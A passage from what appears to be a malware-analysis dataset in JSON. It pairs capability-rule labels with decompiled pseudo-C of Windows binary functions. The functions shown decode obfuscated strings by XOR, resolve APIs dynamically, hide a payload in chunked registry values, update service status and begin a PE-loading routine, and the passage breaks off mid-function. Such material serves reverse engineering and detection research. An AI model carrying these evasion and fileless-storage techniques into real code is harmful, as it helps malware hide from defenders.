0x3e521838;\n        var_3dh = 0x5c00293a;\n        var_39h = 0x597a0e20;\n        var_35h = 0x33;\n        var_20h = 0x52336d4c;\n        var_1ch._0_2_ = CONCAT11(var_1ch._1_1_, 0x77);\n        uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1d);\n        puVar9 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar8);\n        var_ch = 0;\n        puVar12 = puVar9;\n        for (iVar11 = 7; iVar11 != 0; iVar11 = iVar11 + -1) {\n            *puVar12 = 0;\n            puVar12 = puVar12 + 1;\n        }\n        *puVar12 = 0;\n        var_14h = &var_50h - puVar9;\n        do {\n            iVar11 = var_ch;\n            pcVar1 = var_ch + puVar9;\n            cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar2 = *(&var_20h + iVar11 % 5);\n            uVar3 = pcVar1[var_14h];\n            cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            var_ch = var_ch + 1;\n            *pcVar1 = cVar7 + ((uVar2 ^ uVar3) - cVar6);\n        } while (var_ch < 0x1c);\n        uVar8 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, puVar9);\n        *0x427b8c = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar8);\n        pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        var_28h = 0;\n        uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar9);\n        pcVar4 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n        uVar8 = (*pcVar5)(0, lpModuleName);\n        (*pcVar4)(uVar8);\n        iVar11 = var_8h;\n        in_EDX = var_18h;\n        if (*0x427b8c == NULL) goto code_r0x0040e68b;\n    }\n    iVar11 = var_8h;\n    var_28h = 0;\n    iVar10 = (**0x427b8c)(var_8h, *in_EDX, in_EDX[1], arg_8h, 0xc, 0, &var_28h);\n    if (-1 < iVar10) {\n    }\ncode_r0x0040e68b:\n    if (var_10h != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar11);\n    }\n    return var_28h;\n}\n",
        "token_count": 1301
    },
    "0040e6a1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040e6a1(uint32_t arg_8h, uint32_t *arg_ch)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    uint16_t uVar4;\n    code *pcVar5;\n    char cVar6;\n    char cVar7;\n    uint uVar8;\n    int32_t iVar9;\n    uint extraout_ECX;\n    int32_t extraout_ECX_00;\n    uint32_t uVar10;\n    int32_t *piVar11;\n    int32_t *in_EDX;\n    int32_t *piVar12;\n    int32_t iVar13;\n    uint32_t uVar14;\n    uchar *puVar15;\n    code *pcVar16;\n    uint var_a8h;\n    uint var_a0h;\n    int32_t var_74h;\n    uint32_t var_70h;\n    int32_t var_6ch;\n    int32_t var_68h;\n    int32_t *var_64h;\n    int32_t var_60h;\n    uint var_5ch;\n    int32_t var_58h;\n    uint var_54h;\n    int32_t var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint32_t var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_23h;\n    uint var_1fh;\n    uint var_1bh;\n    uint var_17h;\n    uchar *var_10h;\n    int32_t *var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_5ch = 0;\n    var_50h = 0;\n    var_38h = 0;\n    var_48h = 0x41d123d;\n    var_44h = 0xa37601c;\n    var_40h._0_2_ = 0x6815;\n    var_8h = 0x68796653;\n    var_4h._0_2_ = 0x4e70;\n    var_64h = in_EDX;\n    fcn.0040826e();\n    iVar13 = 0;\n    do {\n        fcn.004034cf(iVar13, *(&var_8h + iVar13 % 6) ^ *(&var_48h + iVar13));\n        iVar13 = iVar13 + 1;\n    } while (iVar13 < 10);\n    var_34h = 0x5e1b4f6f;\n    var_30h = 0x1d0c0346;\n    var_2ch = 0x41475444;\n    var_28h._0_1_ = 5;\n    stack0xffffffd5 = 0x4a5a575f;\n    var_23h = 0x5c455021;\n    var_1fh = 0x43612257;\n    var_1bh = 0x42295b5a;\n    var_17h = 0x4c0c0342;\n    var_8h = 0x314c3835;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x31);\n    fcn.0040f6c2(extraout_ECX);\n    iVar13 = var_60h;\n    var_ch = &var_34h - var_60h;\n    var_10h = NULL;\n    do {\n        puVar15 = var_10h;\n        pcVar1 = var_10h + iVar13;\n        cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar2 = *(&var_8h + puVar15 % 5);\n        uVar3 = *(var_ch + pcVar1);\n        cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        var_10h = var_10h + 1;\n        *pcVar1 = cVar7 + ((uVar2 ^ uVar3) - cVar6);\n        pcVar16 = _sym.imp.KERNEL32.dll_GetModuleHandleA;\n    } while (var_10h < 0x21);\n    if ((*0x427fcc & 1) == 0) {\n        *0x427fcc = *0x427fcc | 1;\n        *0x427fd4 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(var_54h);\n    }\n    if ((*0x427fcc & 2) == 0) {\n        *0x427fcc = *0x427fcc | 2;\n        *0x427fd0 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(*0x427fd4, iVar13);\n    }\n    iVar9 = *0x427fd4;\n    if (*0x427fd4 == 0) {\n        *0x427fd4 = (*pcVar16)(var_54h);\n        iVar9 = extraout_ECX_00;\n    }\n    pcVar16 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (*0x427fd0 == NULL) {\n        var_34h = 0x5e1b4f6f;\n        var_30h = 0x1d0c0346;\n        var_2ch = 0x41475444;\n        var_28h._0_1_ = 5;\n        stack0xffffffd5 = 0x4a5a575f;\n        var_23h = 0x5c455021;\n        var_1fh = 0x43612257;\n        var_1bh = 0x42295b5a;\n        var_17h = 0x4c0c0342;\n        var_8h = 0x314c3835;\n        var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x31);\n        fcn.0040f6c2(iVar9);\n        piVar12 = var_ch;\n        var_ch = &var_34h - var_ch;\n        var_10h = NULL;\n        do {\n            puVar15 = var_10h;\n            pcVar1 = var_10h + piVar12;\n            cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar2 = *(&var_8h + puVar15 % 5);\n            uVar3 = *(var_ch + pcVar1);\n            cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            var_10h = var_10h + 1;\n            *pcVar1 = cVar7 + ((uVar2 ^ uVar3) - cVar6);\n        } while (var_10h < 0x21);\n        *0x427fd0 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(*0x427fd4, piVar12);\n        pcVar16 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, piVar12);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n        iVar13 = var_60h;\n    }\n    fcn.0040dddd();\n    if ((*0x427fd0 != NULL) && (iVar9 = (**0x427fd0)(var_4ch, 0, &var_a8h, 0x30, &var_58h),  -1 < iVar9)) {\n        uVar8 = (*pcVar16)(8, 0x200);\n        pcVar5 = _sym.imp.KERNEL32.dll_HeapAlloc;\n        var_10h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar8);\n        if (var_10h != NULL) {\n            uVar8 = (*pcVar16)(8, 0x100);\n            iVar9 = (*pcVar5)(uVar8);\n            if (((iVar9 != 0) && (var_58h = fcn.0040e34b(iVar9, 0x28),  var_58h != 0)) &&\n               (var_58h = fcn.0040e34b(iVar9 + 0x28, 0x40),  var_58h != 0)) {\n                var_44h = *(iVar9 + 0x3c);\n                var_6ch = *(iVar9 + 0x18) + 0x10;\n                var_48h = *(iVar9 + 0x38);\n                var_8h = *(iVar9 + 0x1c) + (0xffffffef < *(iVar9 + 0x18));\n                var_38h = 4;\n                piVar12 = var_64h + 2;\n                var_ch = piVar12;\n                if ((var_48h != var_6ch) || (*(iVar9 + 0x3c) != var_8h)) {\n                    uVar14 = 4;\n                    do {\n                        var_58h = fcn.0040e34b(iVar9 + 0x68, 0x98);\n                        iVar13 = var_60h;\n                        if (var_58h == 0) break;\n                        uVar14 = uVar14 + 0x120;\n                        var_68h = *(iVar9 + 0x68);\n                        var_74h = *(iVar9 + 0x6c);\n                        var_48h = var_68h;\n                        var_44h = var_74h;\n                        var_38h = uVar14;\n                        if (uVar14 <= arg_8h) {\n                            uVar4 = *(iVar9 + 0xb0);\n                            *(piVar12 + 6) = var_50h;\n                            piVar12[5] = *(iVar9 + 0xd0);\n                            *(piVar12 + 7) = *(iVar9 + 0xd4);\n                            piVar12[4] = *(iVar9 + 0xa8);\n                            piVar12[2] = *(iVar9 + 0x98);\n                            piVar12[3] = *(iVar9 + 0x9c);\n                            var_70h = uVar4 >> 1;\n                            puVar15 = var_10h;\n                            for (iVar13 = 0x200; iVar13 != 0; iVar13 = iVar13 + -1) {\n                                *puVar15 = 0;\n                                puVar15 = puVar15 + 1;\n                            }\n                            if ((var_70h < 0x100) && (var_58h = fcn.0040e34b(var_10h, *(iVar9 + 0xb0)),  var_58h != 0))\n                            {\n                                uVar10 = 0;\n                                if (var_70h != 0) {\n                                    do {\n                                        *(uVar10 + 0x20 + var_ch) = var_10h[uVar10 * 2];\n                                        uVar10 = uVar10 + 1;\n                                        uVar14 = var_38h;\n                                    } while (uVar10 < var_70h);\n                                }\n                                *(var_70h + 0x20 + var_ch) = 0;\n                                piVar11 = NULL;\n                                piVar12 = var_ch + 8;\n                                do {\n                                    cVar6 = *piVar12;\n                                    if (cVar6 == '\\\\') {\n                                        piVar11 = piVar12;\n                                    }\n                                    piVar12 = piVar12 + 1;\n                                } while (cVar6 != '\\0');\n                                *(var_ch + 0x1e) = (piVar11 - var_ch) + -0x1f;\n                            }\n                            piVar12 = var_ch + 0x48;\n                            var_50h = var_50h + 1;\n                            var_ch = piVar12;\n                        }\n                    } while ((var_68h != var_6ch) || (iVar13 = var_60h,  var_74h != var_8h));\n                }\n                pcVar16 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                if (var_64h != NULL) {\n                    *var_64h = var_50h;\n                    pcVar16 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                }\n            }\n            uVar8 = (*pcVar16)(0, var_10h);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n            if (iVar9 != 0) {\n                uVar8 = (*pcVar16)(0, iVar9);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n            }\n        }\n    }\n    if (arg_ch != NULL) {\n        *arg_ch = var_38h;\n    }\n    if ((var_38h <= arg_8h) && (var_38h != 0)) {\n        var_5ch = 1;\n    }\n    uVar8 = (*pcVar16)(0, iVar13);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n    uVar8 = (*pcVar16)(0, var_54h);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n    return var_5ch;\n}\n",
        "token_count": 2982
    },
    "0040ef64": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040ef64(uint32_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    uint32_t *puVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    int32_t in_EDX;\n    uint uVar6;\n    char *pcVar7;\n    uint32_t *puVar8;\n    uint var_10h;\n    uint lpString2;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    fcn.0040dddd();\n    fcn.0040e6a1(0, &var_4h);\n    var_8h = var_4h;\n    puVar3 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, var_4h, 0x3000, 4);\n    if (puVar3 != NULL) {\n        do {\n            iVar4 = fcn.0040e6a1(var_8h, &var_4h);\n            uVar1 = var_4h;\n            if ((iVar4 != 0) || (var_4h <= var_8h)) break;\n            var_8h = var_4h;\n            (*_sym.imp.KERNEL32.dll_VirtualFree)(puVar3, 0, 0x8000);\n            puVar3 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, uVar1, 0x3000, 4);\n        } while (puVar3 != NULL);\n        uVar6 = 2;\n        if ((puVar3 != NULL) && (uVar1 <= var_8h)) {\n            var_8h = 0;\n            puVar8 = puVar3 + 2;\n            if (*puVar3 != 0) {\n                do {\n                    pcVar7 = *(puVar8 + 0x1e) + 0x20 + puVar8;\n                    if ((in_EDX == 0) || (iVar4 = (*_sym.imp.KERNEL32.dll_lstrcmpiA)(pcVar7, in_EDX),  iVar4 == 0)) {\ncode_r0x0040f06b:\n                        uVar6 = 0;\n                        *arg_8h = puVar8[2];\n                        arg_8h[1] = puVar8[3];\n                        if (arg_ch != NULL) {\n                            *arg_ch = puVar8[4];\n                        }\n                        goto code_r0x0040f08c;\n                    }\n                    cVar2 = *pcVar7;\n                    pcVar5 = pcVar7;\n                    while (cVar2 != '.') {\n                        if (cVar2 == '\\0') goto code_r0x0040f056;\n                        pcVar5 = pcVar5 + 1;\n                        cVar2 = *pcVar5;\n                    }\n                    *pcVar5 = '\\0';\n                    iVar4 = (*_sym.imp.KERNEL32.dll_lstrcmpiA)(pcVar7, in_EDX);\n                    if (iVar4 == 0) goto code_r0x0040f06b;\ncode_r0x0040f056:\n                    puVar8 = puVar8 + 0x48;\n                    var_8h = var_8h + 1;\n                } while (var_8h < *puVar3);\n                uVar6 = 2;\n            }\n            goto code_r0x0040f08c;\n        }\n    }\n    uVar6 = 8;\ncode_r0x0040f08c:\n    if (puVar3 != NULL) {\n        (*_sym.imp.KERNEL32.dll_VirtualFree)(puVar3, 0, 0x8000);\n    }\n    return uVar6;\n}\n",
        "token_count": 829
    },
    "0040fa6e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.0040fa6e(int32_t *param_1)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    char cVar5;\n    char cVar6;\n    uint uVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    int32_t extraout_ECX;\n    int32_t extraout_ECX_00;\n    uint32_t unaff_EBX;\n    uint32_t uVar11;\n    uint *puVar12;\n    uint lpValueName;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    int32_t ARG_1;\n    uint var_28h;\n    uint var_24h;\n    uint32_t var_20h;\n    int32_t *var_1ch;\n    uint32_t var_18h;\n    uint32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t hKey;\n    int32_t var_4h;\n    \n    uVar11 = unaff_EBX & 0xffffff00;\n    var_1ch = param_1;\n    var_18h = uVar11;\n    uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    uVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar7);\n    if ((((uVar8 != 0) && (param_1 != NULL)) && (*param_1 != 0)) && (param_1[1] != 0)) {\n        var_20h = uVar8;\n        fcn.0040f94c();\n        hKey = fcn.0040f8f7(0x20006);\n        if (hKey != 0) {\n            var_4h = *param_1;\n            var_3ch = 0x79207a62;\n            var_38h = 0x535f4714;\n            var_34h = 0x7a474b1d;\n            var_28h = 0x79537a47;\n            var_24h._0_1_ = 0x4b;\n            var_14h = (((var_4h + 0x7cfffU) / 0x7d000) * 0x7d000) / 0x7d000;\n            var_10h = 0;\n            puVar12 = &lpValueName;\n            for (iVar10 = 0x40; iVar10 != 0; iVar10 = iVar10 + -1) {\n                *puVar12 = 0;\n                puVar12 = puVar12 + 1;\n            }\n            do {\n                fcn.0040ff67(iVar10);\n                iVar10 = &var_3ch - ARG_1;\n                var_ch = 0;\n                do {\n                    iVar9 = var_ch;\n                    pcVar1 = ARG_1 + var_ch;\n                    cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                    uVar2 = *(&var_28h + iVar9 % 5);\n                    uVar3 = pcVar1[iVar10];\n                    cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                    iVar4 = var_10h;\n                    iVar9 = ARG_1;\n                    var_ch = var_ch + 1;\n                    *pcVar1 = cVar6 + ((uVar2 ^ uVar3) - cVar5);\n                } while (var_ch < 0xc);\n                puVar12 = &lpValueName;\n                for (iVar10 = 0x40; iVar10 != 0; iVar10 = iVar10 + -1) {\n                    *puVar12 = 0;\n                    puVar12 = puVar12 + 1;\n                }\n                (*_sym.imp.USER32.dll_wsprintfW)(&lpValueName, iVar9, *0x42797c, iVar4);\n                (*_sym.imp.ADVAPI32.dll_RegDeleteValueW)(hKey, &lpValueName);\n                fcn.0040ff36();\n                var_10h = iVar4 + 1;\n                iVar10 = extraout_ECX;\n            } while (var_10h < 0x32);\n            var_10h = 0;\n            uVar11 = var_18h;\n            if (0 < var_14h) {\n                var_ch = 0;\n                var_3ch = 0x79207a62;\n                var_38h = 0x535f4714;\n                var_34h = 0x7a474b1d;\n                var_28h = 0x79537a47;\n                var_24h._0_1_ = 0x4b;\n                do {\n                    fcn.0040ff67(iVar10);\n                    iVar10 = 0;\n                    var_18h = &var_3ch - ARG_1;\n                    do {\n                        pcVar1 = ARG_1 + iVar10;\n                        cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                        uVar2 = *(&var_28h + iVar10 % 5);\n                        uVar3 = pcVar1[var_18h];\n                        cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                        iVar4 = var_10h;\n                        iVar9 = ARG_1;\n                        iVar10 = iVar10 + 1;\n                        *pcVar1 = cVar6 + ((uVar2 ^ uVar3) - cVar5);\n                    } while (iVar10 < 0xc);\n                    puVar12 = &lpValueName;\n                    for (iVar10 = 0x40; iVar10 != 0; iVar10 = iVar10 + -1) {\n                        *puVar12 = 0;\n                        puVar12 = puVar12 + 1;\n                    }\n                    (*_sym.imp.USER32.dll_wsprintfW)(&lpValueName, iVar9, *0x42797c, iVar4);\n                    iVar10 = var_ch;\n                    iVar9 = 0x7d000;\n                    if (var_4h < 0x7d000) {\n                        iVar9 = var_4h;\n                    }\n                    iVar9 = (*_sym.imp.ADVAPI32.dll_RegSetValueExW)\n                                      (hKey, &lpValueName, 0, 3, var_1ch[1] + var_ch, iVar9);\n                    uVar11 = 1 - (iVar9 != 0);\n                    fcn.0040ff36();\n                    var_10h = iVar4 + 1;\n                    var_4h = var_4h + -0x7d000;\n                    var_ch = iVar10 + 0x7d000;\n                    iVar10 = extraout_ECX_00;\n                } while (var_10h < var_14h);\n            }\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n            uVar8 = var_20h;\n        }\n        uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, uVar8);\n        uVar8 = (*_sym.imp.KERNEL32.dll_HeapFree)(uVar7);\n    }\n    return uVar8 & 0xffffff00 | uVar11 & 0xff;\n}\n",
        "token_count": 1642
    },
    "0040fcdb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040fcdb(int32_t *param_1)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    char cVar4;\n    char cVar5;\n    uint uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    uchar *puVar11;\n    uint *puVar12;\n    int32_t iVar13;\n    uchar *puVar14;\n    uint lpValueName;\n    uint var_50h;\n    uint var_48h;\n    int32_t var_44h;\n    uchar *var_3ch;\n    int32_t hKey;\n    int32_t var_34h;\n    uint lpType;\n    int32_t var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t lpcbData;\n    int32_t var_10h;\n    int32_t *var_ch;\n    uchar *var_8h;\n    uint var_1h;\n    \n    *param_1 = 0;\n    param_1[1] = 0;\n    var_ch = param_1;\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n    if (iVar7 != 0) {\n        var_2ch = iVar7;\n        fcn.0040f94c();\n        hKey = fcn.0040f8f7(0x20019);\n        if (hKey != 0) {\n            var_28h = 0x79207a62;\n            var_34h = 0;\n            puVar12 = &lpValueName;\n            for (iVar7 = 0x40; iVar7 != 0; iVar7 = iVar7 + -1) {\n                *puVar12 = 0;\n                puVar12 = puVar12 + 1;\n            }\n            var_24h = 0x535f4714;\n            var_20h = 0x7a474b1d;\n            var_1ch = 0x79537a47;\n            var_18h._0_1_ = 0x4b;\n            do {\n                puVar12 = &var_50h;\n                for (iVar7 = 8; iVar7 != 0; iVar7 = iVar7 + -1) {\n                    *puVar12 = 0;\n                    puVar12 = puVar12 + 1;\n                }\n                puVar12 = &lpValueName;\n                for (iVar7 = 0x40; iVar7 != 0; iVar7 = iVar7 + -1) {\n                    *puVar12 = 0;\n                    puVar12 = puVar12 + 1;\n                }\n                fcn.0040ff67(0);\n                iVar7 = var_44h;\n                var_10h = &var_28h - var_44h;\n                var_8h = NULL;\n                do {\n                    iVar8 = var_8h;\n                    pcVar1 = iVar7 + var_8h;\n                    cVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                    uVar2 = *(&var_1ch + iVar8 % 5);\n                    uVar3 = pcVar1[var_10h];\n                    cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                    iVar8 = var_34h;\n                    var_8h = var_8h + 1;\n                    *pcVar1 = cVar5 + ((uVar2 ^ uVar3) - cVar4);\n                } while (var_8h < 0xc);\n                (*_sym.imp.USER32.dll_wsprintfW)(&lpValueName, iVar7, *0x42797c, var_34h);\n                iVar7 = var_2ch;\n                iVar13 = 0;\n                var_1h._0_1_ = '\\0';\n                var_8h = NULL;\n                var_34h = iVar8 + 1;\n                var_10h = 0;\n                iVar8 = fcn.0040f8f7(0x20019);\n                param_1 = var_ch;\n                if (iVar8 != 0) {\n                    lpType = 3;\n                    lpcbData = 0;\n                    iVar9 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)(iVar8, &lpValueName, 0, &lpType, 0, &lpcbData);\n                    if (iVar9 == 0) {\n                        uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, lpcbData);\n                        var_3ch = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n                        if (var_3ch == NULL) {\n                            puVar11 = NULL;\n                            iVar9 = iVar13;\n                        }\n                        else {\n                            iVar10 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)\n                                               (iVar8, &lpValueName, 0, &lpType, var_3ch, &lpcbData);\n                            puVar11 = var_3ch;\n                            iVar9 = lpcbData;\n                            if (iVar10 != 0) goto code_r0x0040fe7e;\n                        }\n                        var_1h._0_1_ = '\\x01';\n                        iVar13 = iVar9;\n                        var_10h = iVar9;\n                        var_8h = puVar11;\n                    }\ncode_r0x0040fe7e:\n                    (*_sym.imp.ADVAPI32.dll_RegCloseKey)(iVar8);\n                    param_1 = var_ch;\n                    if (((var_1h != '\\0') && (var_8h != NULL)) && (iVar13 != 0)) {\n                        if (var_ch[1] == 0) {\n                            uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, iVar13);\n                            iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n                        }\n                        else {\n                            uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_ch[1], *var_ch + iVar13);\n                            iVar7 = (*_sym.imp.KERNEL32.dll_HeapReAlloc)(uVar6);\n                        }\n                        param_1[1] = iVar7;\n                        puVar11 = var_8h;\n                        puVar14 = iVar7 + *param_1;\n                        for (iVar8 = var_10h; iVar8 != 0; iVar8 = iVar8 + -1) {\n                            *puVar14 = *puVar11;\n                            puVar11 = puVar11 + 1;\n                            puVar14 = puVar14 + 1;\n                        }\n                        *param_1 = *param_1 + var_10h;\n                        uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_8h);\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n                        iVar7 = var_2ch;\n                    }\n                }\n                fcn.0040ff36();\n            } while (var_1h != '\\0');\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n        }\n        uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar7);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n    }\n    uVar6 = 1;\n    if ((*param_1 == 0) || (param_1[1] == 0)) {\n        uVar6 = 0;\n    }\n    return uVar6;\n}\n",
        "token_count": 1749
    },
    "0040ffd0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040ffd0(uint arg_8h)\n\n{\n    int32_t in_ECX;\n    \n    *0x427b98 = in_ECX != 2;\n    *0x427b9c = 0;\n    *0x427ba8 = arg_8h;\n    if ((in_ECX == 4) || (in_ECX == 1)) {\n        *0x427ba4 = 0;\n    }\n    else {\n        *0x427ba4 = *0x427638;\n        *0x427638 = *0x427638 + 1;\n    }\n    *0x427b94 = in_ECX;\n    (*_sym.imp.ADVAPI32.dll_SetServiceStatus)(*0x427bac, 0x427b90);\n    return;\n}\n",
        "token_count": 177
    },
    "00410114": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00410114(int32_t *param_1, int32_t *param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uchar *puVar3;\n    int32_t iVar4;\n    uchar *puVar5;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if ((param_1 != NULL) && (param_2 != NULL)) {\n        if (param_1[1] != 0) {\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, param_1[1]);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        }\n        uVar2 = (*pcVar1)(8, *param_2);\n        puVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        param_1[1] = puVar3;\n        if (puVar3 != NULL) {\n            for (iVar4 = *param_2; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar3 = 0;\n                puVar3 = puVar3 + 1;\n            }\n            *param_1 = *param_2;\n            puVar3 = param_2[1];\n            puVar5 = param_1[1];\n            for (iVar4 = *param_2; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar5 = *puVar3;\n                puVar3 = puVar3 + 1;\n                puVar5 = puVar5 + 1;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 369
    },
    "00410b3e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00410b3e(code **arg_8h)\n\n{\n    code **ppcVar1;\n    uint32_t uVar2;\n    code cVar3;\n    int16_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    char cVar7;\n    int32_t iVar8;\n    code **ppcVar9;\n    code *pcVar10;\n    uint32_t *puVar11;\n    uint32_t uVar12;\n    uint var_2ch;\n    uint var_28h;\n    code *var_24h;\n    uint var_20h;\n    uint32_t var_1ch;\n    uint *var_18h;\n    uint var_14h;\n    code *var_10h;\n    int32_t *var_ch;\n    code **var_8h;\n    uint32_t var_4h;\n    \n    ppcVar1 = arg_8h;\n    uVar12 = 0;\n    ppcVar9 = arg_8h[0xc];\n    if (ppcVar9 == NULL) {\n        ppcVar1 = arg_8h + 0xe;\n        pcVar10 = *arg_8h;\n        arg_8h = ppcVar9;\n        (*pcVar10)(0, 0, ppcVar1, &var_2ch);\n    }\n    else {\n        var_10h = ppcVar9[0xf] + ppcVar9;\n        var_24h = *(var_10h + 0x14);\n        var_1ch = *(var_10h + 6);\n        var_14h = 0;\n        arg_8h = ppcVar9;\n        if (*(var_10h + 0x80) != 0) {\n            var_ch = *(var_10h + 0x80) + ppcVar9;\n            iVar6 = var_ch[3];\n            if 